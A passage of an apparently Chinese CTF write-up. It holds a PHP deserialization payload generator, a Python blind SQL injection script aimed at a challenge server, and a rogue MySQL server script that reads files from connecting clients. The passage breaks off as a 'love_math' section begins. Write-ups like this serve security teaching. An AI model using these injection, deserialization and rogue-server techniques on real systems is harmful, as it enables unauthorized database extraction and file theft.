</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Handle</span>{<span style=color:#f92672>...</span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Flag</span>{<span style=color:#f92672>...</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$f<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Flag</span>(<span style=color:#e6db74>&#34;flag.php&#34;</span>);
</span></span><span style=display:flex><span>$f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token</span><span style=color:#f92672>=&amp;</span>$f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token_flag</span>;
</span></span><span style=display:flex><span>$g<span style=color:#f92672>=</span><span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>handle</span>($f));
</span></span><span style=display:flex><span>$gg<span style=color:#f92672>=</span><span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;:1:{s&#34;</span>, <span style=color:#e6db74>&#34;:2:{s&#34;</span>, $g);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;http://[url]///index.php?file=hint.php&amp;payload=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>urlencode</span>($gg);
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>http://[url]///index.php?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%224e4b5fbbbb602b6d35bea8460aa8f8e5%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=ae446a91857e106a4.png alt></p><h1 id=全宇宙最简单的sql>全宇宙最简单的SQL<a hidden class=anchor aria-hidden=true href=#全宇宙最简单的sql>#</a></h1><p>基于exp()函数报错的盲注，加上在未知列名情况下注出数据的技巧，可得到user表第二列数据为 F1AG@1s-
at_/fll1llag_h3r3 ，作为admin的密码登录后进入后台，可以连接远程数据库，伪造MySQL服务的可以读取flag
文件。知识点在DDCTF2017和DDCTF2019出现过。</p><p>记录个盲注脚本：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-51>51</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span>re
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://39.97.227.64:52105/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Content-Length&#34;</span>: <span style=color:#e6db74>&#34;40&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Cache-Control&#34;</span>: <span style=color:#e6db74>&#34;max-age=0&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Origin&#34;</span>: <span style=color:#e6db74>&#34;http://39.106.224.151:52105&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Upgrade-Insecure-Requests&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Content-Type&#34;</span>: <span style=color:#e6db74>&#34;application/x-www-form-urlencoded&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Accept&#34;</span>: <span style=color:#e6db74>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Referer&#34;</span>: <span style=color:#e6db74>&#34;http://39.106.224.151:52105/&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Accept-Language&#34;</span>: <span style=color:#e6db74>&#34;zh-CN,zh;q=0.9&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Cookie&#34;</span>: <span style=color:#e6db74>&#34;PHPSESSID=uj6gjpnpsham8ihv8alnegm8e0&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Connection&#34;</span>: <span style=color:#e6db74>&#34;close&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># payload = &#34;&#39;^exp({}-ascii(substr((select ),{},1)))#&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># payload = &#34;admin&#39;^exp({}-ascii(substr((select `2`  from (select 1,2 union select * from user)orz#),{},1)))#&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39;^exp(</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>-ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>,1)))#&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;username&#39;</span>: payload,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;password&#39;</span>: <span style=color:#e6db74>&#39;admin&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>709</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>126</span>
</span></span><span style=display:flex><span>j <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> j <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>30</span>:
</span></span><span style=display:flex><span>    print str(j)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>32</span>,<span style=color:#ae81ff>127</span>):
</span></span><span style=display:flex><span>        p[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> payload<span style=color:#f92672>.</span>format(e <span style=color:#f92672>+</span> c, j)
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>p, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span>        <span style=color:#75715e># print r.headers[&#39;Content-Length&#39;]</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># print r.content</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>&#34;数据库操作失败&#34;</span>, r<span style=color:#f92672>.</span>content) <span style=color:#f92672>==</span> []:
</span></span><span style=display:flex><span>            res <span style=color:#f92672>+=</span> chr(c)
</span></span><span style=display:flex><span>            print res
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        c <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># time.sleep(1)</span>
</span></span><span style=display:flex><span>    j <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> <span style=color:#ae81ff>126</span>
</span></span></code></pre></td></tr></table></div></div><p>盲注结果：</p><p><img loading=lazy src=c1d2d110302dcde3b.png alt></p><p>MySQL服务端伪造脚本：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span>file<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/fll1llag_h3r3&#34;</span>
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span>socket<span style=color:#f92672>.</span>socket()
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>bind((<span style=color:#e6db74>&#34;&#34;</span>,<span style=color:#ae81ff>3306</span>))
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>listen(<span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>c,ip<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span>accept()
</span></span><span style=display:flex><span>c<span style=color:#f92672>.</span>sendall(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>c<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>666</span>)
</span></span><span style=display:flex><span>c<span style=color:#f92672>.</span>sendall(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>c<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>666</span>)
</span></span><span style=display:flex><span>c<span style=color:#f92672>.</span>sendall(chr(len(file)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00\x01\xFB</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>+</span>file)
</span></span><span style=display:flex><span>print c<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>666</span>)
</span></span><span style=display:flex><span>c<span style=color:#f92672>.</span>close()
</span></span></code></pre></td></tr></table></div></div><p>伪造结果：</p><p><img loading=lazy src=7a1627edaa9ca39a8.png alt></p><p>参考文章：</p><ul><li><a href=https://www.cnblogs.com/apossin/p/10127496.html>伪造mysql服务端实现任意读取</a></li><li><a href=https://xz.aliyun.com/t/3973>利用MySQL LOAD DATA特性达到任意文件读取</a></li><li><a href=https://www.bodkin.ren/index.php/archives/166/>DDCTF 2017 SQL注入-绕过未知字段名</a></li><li><a href=https://xz.aliyun.com/t/4914>通过CISCN2019 Day 1 SQL注入思考基于运行时错误的盲注</a></li></ul><h1 id=love_math>love_math<a hidden class=anchor aria-hidden=true href=#love_math>#</a></h1><p>calc.php泄露源码</p><p><img loading=lazy src=e2ff7a7febff72bf1.png alt></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-9> 9</a>
